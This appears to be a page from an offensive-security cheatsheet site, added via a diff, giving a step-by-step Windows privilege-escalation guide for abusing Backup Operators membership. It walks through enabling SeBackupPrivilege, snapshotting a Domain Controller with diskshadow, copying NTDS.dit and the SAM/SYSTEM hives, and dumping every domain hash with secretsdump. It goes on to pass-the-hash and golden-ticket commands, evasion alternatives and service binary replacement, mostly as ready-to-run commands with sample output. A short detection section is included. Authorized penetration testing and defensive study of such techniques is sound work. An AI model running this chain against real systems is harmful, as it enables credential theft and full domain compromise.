@@ -1,0 +1,393 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Backup Operators · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Windows › Privilege Escalation</nav><h1>Backup Operators</h1><p class="cx-lede">Domain-compromise escalation via the Backup Operators group - membership grants SeBackupPrivilege and SeRestorePrivilege, which allow reading and writing any file with backup semantics regardless of DACL. On a Domain Controller this means dumping NTDS.dit (the AD credential database) and the SAM/SYSTEM registry hives, leading to every domain account&#x27;s NTLM hash. The diskshadow VSS workflow handles the locked-file problem; SeBackupPrivilegeUtils handles the copy; secretsdump.py handles the offline credential extraction.</p><div class="cx-tags"><span class="cx-tag">MITRE T1003.002, T1003.003, T1078.002, T1068</span><span class="cx-tag">D3FEND D3-LFP</span><span class="cx-tag">IMPACT PrivEsc, CredentialTheft, DomainCompromise, AdminCompromise</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>The Backup Operators group is functionally equivalent to Domain Admin when its members can log on to a Domain Controller. Members hold <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>, which together provide read and write access to any file on the system, bypassing DACLs. On a DC, the path to domain compromise is: enable the privilege → snapshot the C: drive with diskshadow (to bypass the NTDS.dit file lock) → copy NTDS.dit and the SYSTEM registry hive → run secretsdump.py offline → recover every domain user's NTLM hash including <code>krbtgt</code> and <code>Administrator</code>.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Confirm membership and privileges
+whoami /groups | findstr &quot;Backup Operators&quot;
+whoami /priv | findstr -i &quot;Backup\|Restore&quot;
+
+# Enable SeBackupPrivilege (Disabled by default in token)
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Set-SeBackupPrivilege
+
+# Snapshot C: to E: (bypasses NTDS.dit lock)
+diskshadow.exe
+DISKSHADOW&gt; set context persistent nowriters
+DISKSHADOW&gt; add volume C: alias cdrive
+DISKSHADOW&gt; create
+DISKSHADOW&gt; expose %cdrive% E:
+DISKSHADOW&gt; exit
+
+# Copy NTDS.dit + SYSTEM hive off the shadow copy
+Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit .\ntds.dit
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SAM SAM.SAV
+
+# Extract hashes offline (attacker host)
+secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL</code></pre></figure>
+<p>Success indicator: <code>krbtgt</code> and <code>Administrator</code> NTLM hashes appear in the secretsdump output. From the <code>krbtgt</code> hash, golden tickets give unlimited domain access.</p>
+<h2 id="why-backup-operators-is-dangerous">Why Backup Operators is dangerous</h2>
+<p>The Backup Operators group exists for a reason: members need to back up files they don't own without granting them full admin rights. The Windows design grants them two privileges:</p>
+<ul>
+<li><strong><code>SeBackupPrivilege</code></strong> - Read any file regardless of DACL, using <code>FILE_FLAG_BACKUP_SEMANTICS</code> on <code>CreateFile</code>.</li>
+<li><strong><code>SeRestorePrivilege</code></strong> - Write any file regardless of DACL, set ACLs, set owners.</li>
+</ul>
+<p>The "backup semantics" flag tells the kernel to skip access checks. Backup software needs this to traverse user profiles, encrypted folders, and protected system directories. Anyone with the privilege can use it for anything - there's no "backup-only" enforcement.</p>
+<p>Additionally:</p>
+<ul>
+<li><strong>Backup Operators members can log on locally to Domain Controllers</strong> by default. Regular Domain Users cannot. The <code>Allow log on locally</code> user-right on DCs includes <code>BUILTIN\Backup Operators</code> in default DC configurations.</li>
+</ul>
+<p>These two facts compose into a full domain compromise: log on to the DC, use <code>SeBackupPrivilege</code> to read <code>NTDS.dit</code>, extract every domain credential.</p>
+<p>This group is treated as equivalent to Domain Admins for risk-modeling purposes in Microsoft's own guidance, despite the name not implying so.</p>
+<h2 id="confirming-membership-and-privileges">Confirming membership and privileges</h2>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes
+====================================== ================ ============ =====================================
+BUILTIN\Backup Operators               Alias            S-1-5-32-551 Mandatory group, Enabled by default
+...</code></pre></figure>
+<p>The presence of <code>BUILTIN\Backup Operators</code> in the membership list is the indicator.</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeMachineAccountPrivilege     Add workstations to domain     Disabled
+SeBackupPrivilege             Back up files and directories  Disabled
+SeRestorePrivilege            Restore files and directories  Disabled
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre></figure>
+<p><code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code> appear, both <code>Disabled</code>. The disabled state is normal - most Windows operations don't require these privileges, so they're held but inactive. Enable them programmatically before use.</p>
+<p>The <code>SeShutdownPrivilege</code> shown above is also notable - it lets the holder shut down a DC, which on its own is a denial-of-service capability worth flagging in reports.</p>
+<h2 id="enabling-the-privileges">Enabling the privileges</h2>
+<p>The <a href="https://github.com/giuliano108/SeBackupPrivilege">SeBackupPrivilege PoC</a> by Giuliano Bertoletti ships two DLLs and a set of PowerShell cmdlets that handle privilege enabling and file copying together. Use these as a unit.</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; Import-Module .\SeBackupPrivilegeUtils.dll
+PS&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+PS&gt; Get-SeBackupPrivilege
+SeBackupPrivilege is disabled
+
+PS&gt; Set-SeBackupPrivilege
+
+PS&gt; Get-SeBackupPrivilege
+SeBackupPrivilege is enabled</code></pre></figure>
+<p>The <code>Set-SeBackupPrivilege</code> cmdlet calls <code>AdjustTokenPrivileges</code> internally to flip the state from <code>Disabled</code> to <code>Enabled</code>.</p>
+<p>After enabling, <code>whoami /priv</code> confirms:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>SeBackupPrivilege             Back up files and directories  Enabled</code></pre></figure>
+<p>Some configurations require an elevated console (UAC consent) before the privilege can be enabled. If the cmdlet fails, run from an elevated shell - <code>whoami /groups</code> will indicate UAC posture.</p>
+<h2 id="bypassing-file-locks-vss-snapshots">Bypassing file locks - VSS snapshots</h2>
+<p><code>SeBackupPrivilege</code> lets you read any file <em>that the kernel will read</em>. The kernel won't read files held with exclusive locks - Active Directory locks <code>NTDS.dit</code> for its own use, so even with the privilege, a direct <code>CreateFile</code> on <code>C:\Windows\NTDS\ntds.dit</code> fails.</p>
+<p>The standard workaround: take a Volume Shadow Copy snapshot of the C: drive. The shadow copy is a point-in-time read-only volume containing every file as it was at snapshot time. <code>NTDS.dit</code> in the shadow copy isn't locked because the AD service is using the version on the live volume, not the snapshot.</p>
+<h3 id="diskshadow-workflow">diskshadow workflow</h3>
+<p><code>diskshadow.exe</code> is the built-in Windows tool for managing Volume Shadow Service. Interactive use:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; diskshadow.exe
+
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC,  10/14/2020 12:57:52 AM
+
+DISKSHADOW&gt; set verbose on
+DISKSHADOW&gt; set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW&gt; set context persistent nowriters
+DISKSHADOW&gt; add volume C: alias cdrive
+DISKSHADOW&gt; create
+DISKSHADOW&gt; expose %cdrive% E:
+DISKSHADOW&gt; exit</code></pre></figure>
+<p>What each command does:</p>
+<ul>
+<li><code>set verbose on</code> - More output for troubleshooting.</li>
+<li><code>set metadata C:\Windows\Temp\meta.cab</code> - Where to save shadow metadata (deleted on exit if <code>persistent</code> isn't set).</li>
+<li><code>set context persistent nowriters</code> - <code>persistent</code> makes the shadow survive diskshadow exit. <code>nowriters</code> skips the VSS writer coordination that AD uses - without this, AD might pause or refuse the snapshot.</li>
+<li><code>add volume C: alias cdrive</code> - Identify the volume to snapshot; alias for later reference.</li>
+<li><code>create</code> - Actually take the snapshot.</li>
+<li><code>expose %cdrive% E:</code> - Mount the shadow copy as drive letter E:.</li>
+<li><code>exit</code> - Leave the interactive prompt.</li>
+</ul>
+<p>After <code>exit</code>, <code>E:\</code> is the read-only snapshot. Verify:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; dir E:
+
+    Directory: E:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         5/6/2021   1:00 PM                Confidential
+d-----        9/15/2018  12:19 AM                PerfLogs
+d-r---        3/24/2021   6:20 PM                Program Files
+d-----        9/15/2018   2:06 AM                Program Files (x86)
+d-----         5/6/2021   1:05 PM                Tools
+d-r---         5/6/2021  12:51 PM                Users
+d-----        3/24/2021   6:38 PM                Windows</code></pre></figure>
+<p>The E:\ drive looks like C:\ at the moment of snapshot. The NTDS.dit on E:\ is <em>not</em> locked by AD.</p>
+<h3 id="non-interactive-diskshadow">Non-interactive diskshadow</h3>
+<p>For scripted use, write the commands to a file:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; echo set context persistent nowriters &gt; diskshadow.txt
+C:\&gt; echo add volume C: alias cdrive &gt;&gt; diskshadow.txt
+C:\&gt; echo create &gt;&gt; diskshadow.txt
+C:\&gt; echo expose %cdrive% E: &gt;&gt; diskshadow.txt
+C:\&gt; echo exit &gt;&gt; diskshadow.txt
+
+C:\&gt; diskshadow.exe /s diskshadow.txt</code></pre></figure>
+<p>The <code>/s</code> flag runs from a script file. Useful for embedding in larger automation.</p>
+<h2 id="copying-ntdsdit">Copying NTDS.dit</h2>
+<p>With the shadow copy mounted, use the SeBackupPrivilege-aware copy cmdlet:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+
+Copied 16777216 bytes</code></pre></figure>
+<p>The cmdlet uses <code>CreateFile</code> with <code>FILE_FLAG_BACKUP_SEMANTICS</code> plus <code>BackupRead</code>/<code>BackupWrite</code> API calls - the kernel-level path that respects <code>SeBackupPrivilege</code>.</p>
+<p>Standard <code>copy</code> or <code>xcopy</code> will fail with access denied even with the privilege enabled, because those commands don't request <code>FILE_FLAG_BACKUP_SEMANTICS</code>. Use the cmdlet, not <code>copy</code>.</p>
+<h3 id="pulling-the-system-hive">Pulling the SYSTEM hive</h3>
+<p><code>NTDS.dit</code> alone is useless - its contents are encrypted with keys derived from the SYSTEM hive's <code>bootKey</code>. Pull both:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
+
+The operation completed successfully.
+
+C:\&gt; reg save HKLM\SAM C:\Tools\SAM.SAV
+
+The operation completed successfully.</code></pre></figure>
+<p><code>reg save</code> works with <code>SeBackupPrivilege</code> to dump any registry hive to a file. <code>SAM</code> is also useful for local administrator hashes; on a DC, <code>SAM</code> contains the DSRM (Directory Services Restore Mode) administrator account which is often shared across DCs.</p>
+<h3 id="robocopy-alternative">Robocopy alternative</h3>
+<p>The built-in <code>robocopy</code> utility has a <code>/B</code> flag for "backup mode" which uses backup semantics:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Thursday, May 6, 2021 1:11:47 PM
+   Source : E:\Windows\NTDS\
+     Dest : C:\Tools\ntds\
+
+    Files : ntds.dit
+
+  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+
+          New Dir          1    E:\Windows\NTDS\
+100%        New File              16.0 m        ntds.dit
+
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         1         0         0         0         0
+   Files :         1         1         0         0         0         0
+   Bytes :   16.00 m   16.00 m         0         0         0         0</code></pre></figure>
+<p><code>/B</code> is the key flag - it tells robocopy to use backup semantics, which requires <code>SeBackupPrivilege</code>. Without it, robocopy hits the standard access-denied path.</p>
+<p>The advantage of robocopy: no external DLLs to drop, no PowerShell modules to import, just a Microsoft-signed binary that's always present. The disadvantage: more visible in process logs as the canonical "I'm exfiltrating data" pattern.</p>
+<h2 id="extracting-credentials-offline">Extracting credentials offline</h2>
+<p>Transfer <code>ntds.dit</code> and <code>SYSTEM.SAV</code> to the attacker host. NTDS.dit is large (often hundreds of MB to multiple GB on real domains); plan transfer accordingly.</p>
+<h3 id="secretsdumppy">secretsdump.py</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
+
+Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
+[*] Reading and decrypting hashes from ntds.dit
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
+student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
+svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::</code></pre></figure>
+<p>Output format is <code>domain\username:RID:LMhash:NThash:::</code>. The RID 500 is the built-in Administrator. RID 502 is the <code>krbtgt</code> account whose hash signs all Kerberos tickets - owning this hash means owning the domain.</p>
+<p>The <code>LMhash</code> field is usually <code>aad3b435b51404eeaad3b435b51404ee</code> (empty LM hash) on modern domains because LM hashes are disabled by default. The <code>NThash</code> (NTLM hash) is what matters.</p>
+<h3 id="what-to-do-with-the-hashes">What to do with the hashes</h3>
+<ul>
+<li><strong>Administrator (RID 500)</strong> - Pass-the-hash to any system. <code>psexec.py -hashes :NTHASH DOMAIN/Administrator@target</code>.</li>
+<li><strong>krbtgt (RID 502)</strong> - Generate golden tickets with <code>mimikatz</code>: <code>kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN-SID /krbtgt:HASH /ptt</code>. The golden ticket lets you impersonate any user in the domain without their password.</li>
+<li><strong>Computer accounts (RID 1000+)</strong> - These end in <code>$</code> (e.g., <code>DC01$</code>). Useful for AD CS abuse, certificate-based escalation, and various lateral-movement tricks.</li>
+<li><strong>All accounts</strong> - Feed the hashes through hashcat (mode 1000 for NTLM) to recover plaintext passwords; often reveals password-reuse patterns across the org.</li>
+</ul>
+<h3 id="dsinternals-as-alternative-extractor">DSInternals as alternative extractor</h3>
+<p>The PowerShell <a href="https://github.com/MichaelGrafnetter/DSInternals">DSInternals</a> module also extracts hashes from NTDS.dit but provides more granular output including supplemental credentials:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; Import-Module .\DSInternals.psd1
+PS&gt; $key = Get-BootKey -SystemHivePath .\SYSTEM
+PS&gt; Get-ADDBAccount -DistinguishedName &#x27;CN=administrator,CN=users,DC=example,DC=local&#x27; -DBPath .\ntds.dit -BootKey $key
+
+DistinguishedName: CN=Administrator,CN=Users,DC=EXAMPLE,DC=LOCAL
+Sid: S-1-5-21-669053619-2741956077-1013132368-500
+SamAccountName: Administrator
+SamAccountType: User
+Enabled: True
+Secrets
+  NTHash: cf3a5525ee9414229e66279623ed5c58
+  LMHash:
+  NTHashHistory:
+  Supplemental Credentials:
+    Kerberos:
+      Credentials:
+        DES_CBC_MD5
+          Key: d60dfbbf20548938
+    KerberosNew:
+      Credentials:
+        AES256_CTS_HMAC_SHA1_96
+          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
+        AES128_CTS_HMAC_SHA1_96
+          Key: 94c300d0e47775b407f2496a5cca1a0a
+        DES_CBC_MD5
+          Key: d60dfbbf20548938</code></pre></figure>
+<p>The Kerberos keys (AES256, AES128, DES) are the keys used to encrypt Kerberos tickets. Useful for:</p>
+<ul>
+<li><strong>Pass-the-key</strong> (similar to pass-the-hash but with AES Kerberos keys)</li>
+<li><strong>Silver ticket forging</strong> for specific services</li>
+<li><strong>Decrypting captured Kerberos tickets</strong> offline</li>
+</ul>
+<p>DSInternals also reveals password history hashes (<code>NTHashHistory</code>), useful for spotting predictable password rotation patterns.</p>
+<h2 id="cleaning-up">Cleaning up</h2>
+<p>After exploitation, optionally clean up the shadow copy:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; diskshadow.exe
+
+DISKSHADOW&gt; list shadows all
+* Shadow copy ID = {dc69eeb9-99f4-4bbd-94a7-c0a3d5f7e6d3}
+...
+
+DISKSHADOW&gt; delete shadows id {dc69eeb9-99f4-4bbd-94a7-c0a3d5f7e6d3}
+DISKSHADOW&gt; exit</code></pre></figure>
+<p>Or unexpose the drive letter without deleting:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>DISKSHADOW&gt; unexpose E:</code></pre></figure>
+<p>This leaves the shadow copy in place but removes the visible drive letter. Useful if you need to come back.</p>
+<h2 id="operational-considerations">Operational considerations</h2>
+<h3 id="detection">Detection</h3>
+<p>Backup Operators abuse leaves significant evidence:</p>
+<ul>
+<li><strong>Sysmon event 11 (FileCreate)</strong> on <code>ntds.dit</code> copies and <code>*.SAV</code> registry exports</li>
+<li><strong>Security event 4673</strong> if backup-privilege use is audited (rare default)</li>
+<li><strong>VSS service activity</strong> - <code>Service Control Manager</code> events when diskshadow runs</li>
+<li><strong>Defender for Identity</strong> - alerts on AD-database file access from unusual processes</li>
+</ul>
+<p>Modern EDR with AD-aware rulesets will catch the diskshadow → reg save → file copy chain. The technique is well-known and signatured. For evasive engagements, alternative paths are:</p>
+<ul>
+<li><strong>DCSync</strong> via <code>mimikatz lsadump::dcsync</code> - uses the AD replication API directly, more legitimate-looking on the wire than file copies, but requires <code>DS-Replication-Get-Changes</code> permission rather than <code>SeBackupPrivilege</code></li>
+<li><strong>Volume Shadow Copy Service via VshadowAPI</strong> rather than <code>diskshadow.exe</code> - less obvious binary execution</li>
+<li><strong>NTDSUtil-based dumping</strong> - uses the AD-native tool, sometimes flagged less aggressively</li>
+</ul>
+<h3 id="restoration">Restoration</h3>
+<p>Engagements that require minimal disruption: the shadow copy itself is non-destructive (it's a read-only snapshot of the live volume), but it consumes disk space. The <code>.SAV</code> files and copied NTDS.dit on the host should be deleted after extraction. Document the timeline carefully - the act of dumping NTDS.dit usually triggers an incident response regardless.</p>
+<h3 id="other-use-cases-for-sebackupprivilege">Other use cases for SeBackupPrivilege</h3>
+<p>Beyond the NTDS.dit attack on DCs, <code>SeBackupPrivilege</code> opens read access to anything on the filesystem:</p>
+<ul>
+<li><strong>Reading other users' protected files</strong> - <code>Copy-FileSeBackupPrivilege C:\Users\admin\Documents\creds.txt out.txt</code></li>
+<li><strong>Reading registry hive backups</strong> - <code>reg save HKU\.DEFAULT default.sav</code> and similar for any hive</li>
+<li><strong>Reading service binaries</strong> owned by <code>TrustedInstaller</code> - useful for offline analysis</li>
+<li><strong>Reading other users' DPAPI master keys</strong> - <code>%APPDATA%\Microsoft\Protect\&lt;SID&gt;\&lt;GUID&gt;</code> - for credential decryption later</li>
+</ul>
+<p><code>SeRestorePrivilege</code> opens write access:</p>
+<ul>
+<li><strong>Service binary replacement</strong> - overwrite <code>C:\Program Files\&lt;app&gt;\service.exe</code> with malicious code</li>
+<li><strong>DLL hijacking on protected paths</strong> - write to <code>C:\Windows\System32\</code> if you can find a missing DLL</li>
+<li><strong>Registry modification</strong> - write keys that ordinary users can't, including autorun locations</li>
+</ul>
+<p>The combination of both on a non-DC host is equivalent to local admin via the service binary replacement path.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Confirm membership</td>
+<td><code>whoami /groups \| findstr "Backup Operators"</code></td>
+</tr>
+<tr>
+<td>Confirm privileges</td>
+<td><code>whoami /priv \| findstr -i "Backup\|Restore"</code></td>
+</tr>
+<tr>
+<td>Enable SeBackupPrivilege</td>
+<td><code>Import-Module .\SeBackupPrivilegeCmdLets.dll; Set-SeBackupPrivilege</code></td>
+</tr>
+<tr>
+<td>Check privilege state</td>
+<td><code>Get-SeBackupPrivilege</code></td>
+</tr>
+<tr>
+<td>Snapshot C: with diskshadow</td>
+<td><code>set context persistent nowriters; add volume C: alias c; create; expose %c% E:</code></td>
+</tr>
+<tr>
+<td>Scripted diskshadow</td>
+<td><code>diskshadow.exe /s script.txt</code></td>
+</tr>
+<tr>
+<td>Copy with backup semantics</td>
+<td><code>Copy-FileSeBackupPrivilege SRC DST</code></td>
+</tr>
+<tr>
+<td>Robocopy with backup mode</td>
+<td><code>robocopy /B SRC DST FILENAME</code></td>
+</tr>
+<tr>
+<td>Save registry hive</td>
+<td><code>reg save HKLM\SYSTEM out.sav</code></td>
+</tr>
+<tr>
+<td>Save SAM</td>
+<td><code>reg save HKLM\SAM SAM.SAV</code></td>
+</tr>
+<tr>
+<td>Save SECURITY</td>
+<td><code>reg save HKLM\SECURITY SECURITY.SAV</code></td>
+</tr>
+<tr>
+<td>Local extraction (no NTDS)</td>
+<td><code>secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL</code></td>
+</tr>
+<tr>
+<td>Domain extraction</td>
+<td><code>secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL</code></td>
+</tr>
+<tr>
+<td>DSInternals load</td>
+<td><code>Import-Module .\DSInternals.psd1; $key = Get-BootKey -SystemHivePath .\SYSTEM</code></td>
+</tr>
+<tr>
+<td>Pass-the-hash with NT hash</td>
+<td><code>psexec.py -hashes :NTHASH DOMAIN/Administrator@target</code></td>
+</tr>
+<tr>
+<td>Golden ticket from krbtgt</td>
+<td><code>mimikatz # kerberos::golden /user:Administrator /domain:DOM /sid:SID /krbtgt:HASH /ptt</code></td>
+</tr>
+<tr>
+<td>Cleanup shadow copy</td>
+<td><code>diskshadow.exe</code>, then <code>delete shadows id {ID}</code></td>
+</tr>
+<tr>
+<td>Detection event</td>
+<td>Sysmon 11 on ntds.dit, sysmon 1 on diskshadow.exe</td>
+</tr>
+<tr>
+<td>Stealthier alternative</td>
+<td><code>mimikatz lsadump::dcsync</code> (requires different permissions)</td>
+</tr>
+</tbody>
+</table>
+<p>For other privilege-based escalation primitives, see <a href="../seimpersonate/index.html">SeImpersonate</a> (token impersonation), <a href="../sedebugprivilege/index.html">SeDebugPrivilege</a> (process memory), <a href="../setakeownership/index.html">SeTakeOwnership</a> (file ownership). For other privileged groups with similar domain-compromise potential, see <a href="../dnsadmins/index.html">DnsAdmins</a> and <a href="../other-privileged-groups/index.html">Other privileged groups</a>.</p>
+<h2 id="next-move">Next move</h2>
+<ul>
+<li><strong>NTDS.dit + SYSTEM hive obtained</strong> → process offline with <code>secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL</code>; you now have every domain user's NT hash including <code>krbtgt</code></li>
+<li><strong>Have <code>krbtgt</code> hash</strong> → forge golden tickets for persistent domain access (long-lived authentication artifact, survives password changes for ten years)</li>
+<li><strong>diskshadow fails (<code>failed to create shadow copy</code>)</strong> → VSS writer may be disabled; try alternative VSS approach via <code>wmic shadowcopy create Volume='C:\\'</code>, or use <code>robocopy /B</code> directly with SeBackup token</li>
+<li><strong>SeBackupPrivilegeUtils not on PATH</strong> → fall back to PowerShell <code>Backup-WindowsRoles</code> or copy the DLL onto the host first; verify <code>whoami /priv</code> actually shows <code>SeBackupPrivilege Enabled</code> in your current token</li>
+<li><strong>Got the hashes but DC is offline / can't authenticate</strong> → use <code>secretsdump</code> LOCAL mode against the offline <code>ntds.dit</code> copy; lateral via <a href="../sedebugprivilege/index.html">pass-the-hash to other hosts</a> using harvested NT hashes</li>
+<li><strong>Not on a DC, just a member server</strong> → SeBackup still reads any file as SYSTEM - pivot to credential hunting (unattend.xml, web.config, browser data) or use the privilege to overwrite a service binary</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../setakeownership/index.html">Previous: SeTakeOwnership</a><a class="cx-next" href="../dnsadmins/index.html">Next: DnsAdmins</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
